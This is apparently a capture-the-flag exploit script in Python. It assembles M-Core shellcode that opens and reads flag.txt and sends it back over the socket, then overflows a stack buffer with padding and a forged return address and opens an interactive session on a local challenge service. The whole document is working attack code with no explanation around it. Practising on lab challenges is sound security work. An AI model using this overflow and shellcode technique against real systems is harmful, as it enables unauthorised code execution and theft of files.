asm = '''.section .text
.global _start

.ascii "%s"
_start:
  bsr get_addr
ret:
  mov r7, r15
open:
  mov r2, r7
  movi r3, 0
  movi r4, 0
  movi	r1, 5
  trap	1
read:
  mov r3, r7
  movi r4, 0x7f
  movi	r1, 3
  trap	1
write:
  movi r2, 1
  mov r3, r7
  movi r4, 0x7f
  movi	r1, 4
  trap	1
get_addr:
  bsr ret
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'mcore'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10008
s = mysock(IP, PORT)
s.send('\n000')
pad = 'AAAAAAAAAAAAAAAA'
SP = 0x7ffec0 + len(pad) + 4
shellcode = pad + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)

'''
cat /tmp/senddata|mcore-elf-run -t -v bin/easy/mcore-elf.x
'''